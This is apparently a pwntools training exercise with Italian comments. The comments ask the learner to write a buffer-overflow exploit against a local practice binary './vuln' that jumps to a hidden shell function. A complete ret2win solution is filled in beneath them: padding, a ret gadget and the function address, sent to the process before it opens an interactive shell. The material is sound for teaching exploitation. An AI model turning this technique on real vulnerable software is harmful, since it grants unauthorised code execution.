#!/usr/bin/env python3
# ESERCIZIO pwntools — scrivi tu l'exploit qui sotto.
#
# OBIETTIVO: far eseguire shell_segreta() al programma ./vuln e ottenere una shell,
#            poi lanciare il comando:  id; echo FATTO_$((6*7))
#
# Hai gia' tutto per farlo da solo. Traccia dei passi (NON copiare, ragiona):
#   1. importa pwntools e carica l'ELF ./vuln nel context
#   2. trova l'offset fino al return address (il buffer e' 48 byte...)
#   3. prendi l'indirizzo di shell_segreta
#   4. ricordi perche' serve un gadget 'ret' prima della funzione? aggiungilo
#   5. costruisci il payload: riempimento + (ret) + funzione
#   6. avvia ./vuln, aspetta il prompt, invia il payload
#   7. invia il comando di verifica e stampa l'output
#
# Quando vuoi un aiuto, scrivimi nel gioco: ti do un indizio, non la soluzione.

from pwn import *

# scrivi qui il tuo exploit...

context.binary = exe = ELF("./vuln")
offset = 56                            #variables=48, rbp=8
#target_func = p64(0x00000000004004a6)
target_func = p64(exe.symbols['shell_segreta'])

rop = ROP(exe)    #return a "rop" object that have completelly mapped all gadjets contained in exe
ret = p64(rop.find_gadget(['ret'])[0])    # uses find_gadjet in the rop object and the [0] is just the ex of that function

payload = b"A"*48    #data
payload += b"B"*8    #rbp
payload += ret
payload += target_func

p = process('./vuln') # p = il telecomando del processo
p.recvuntil(b"Codice di accesso:") # aspetta il prompt
p.sendline(payload) # invia l'overflow -> parte shell_segreta

p.interactive() # entri nella shell: scrivi tu i comandi












